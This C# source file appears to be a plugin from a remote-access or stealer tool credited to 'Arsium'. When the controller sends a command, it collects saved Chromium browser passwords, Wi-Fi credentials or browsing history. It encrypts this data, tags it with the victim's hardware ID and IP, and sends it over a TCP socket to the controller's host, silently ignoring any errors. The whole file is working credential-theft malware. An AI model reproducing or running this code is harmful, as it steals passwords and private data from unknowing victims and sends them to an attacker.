using Shared;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public async static Task Main(Host H, string HWID, object[] Param , Socket Base, string key, string BaseIP) 
        {
            try
            {
                Socket S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint ep = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                S.Connect(ep);
                Shared.PacketTypes.PacketType T = (Shared.PacketTypes.PacketType)Param[0];
                Data D = new Data();
                switch (T)
                {
                    case Shared.PacketTypes.PacketType.PASSWORDS:
                        await Task.Run(() => Chromium.Recovery(ref D));
                        D.HWID = HWID;
                        D.Type = Shared.PacketTypes.PacketType.PASSWORDS;
                        D.IP_Origin = BaseIP;
                        await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case Shared.PacketTypes.PacketType.WIFI:
                       await Task.Run(() => Wifi.Recovery(ref D));
                        D.HWID = HWID;
                        D.Type = Shared.PacketTypes.PacketType.WIFI;
                        D.IP_Origin = BaseIP;
                        await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case Shared.PacketTypes.PacketType.HISTORY:
                        await Task.Run(() => History.Recovery(ref D));
                        D.HWID = HWID;
                        D.Type = Shared.PacketTypes.PacketType.HISTORY;
                        D.IP_Origin = BaseIP;
                        await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;
                }
                S.Close();
                S.Dispose();
            }
            catch (System.Exception)
            {
            }
            finally 
            {
                Shared.Utils.ClearMem();           
            }
        }
    }
}
